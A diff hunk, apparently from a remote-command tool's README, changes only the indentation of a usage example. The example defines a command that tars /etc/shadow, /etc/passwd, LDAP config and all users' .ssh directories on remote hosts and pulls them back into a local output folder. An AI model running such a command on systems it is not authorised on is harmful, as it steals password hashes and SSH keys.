@@ -125,13 +125,13 @@ With `commands -r` diplay the results:
 Define an alias `get_files` for a remote command `tar -cf -  /etc/passwd /etc/ldap.conf /etc/shadow /home/*/.ssh /etc/fstab | gzip | uuencode /dev/stdout; exit 0`
  and pipe it to a local `uudecode -o - |tar xzf -`, with:
 
-   commands -a get_files "tar -cf -  /etc/passwd /etc/ldap.conf /etc/shadow /home/*/.ssh /etc/fstab | gzip | uuencode /dev/stdout; exit 0" -p "uudecode -o - |tar xzf -"
+    commands -a get_files "tar -cf -  /etc/passwd /etc/ldap.conf /etc/shadow /home/*/.ssh /etc/fstab | gzip | uuencode /dev/stdout; exit 0" -p "uudecode -o - |tar xzf -"
 
 `exit 0` is to override tar's exit code in case of missing files.
 
 Run te defined command with:
 
-   run_cmd -c get_files
+    run_cmd -c get_files
 
 The output you will find in the folder `output/<host>_<port>/username/...`
 
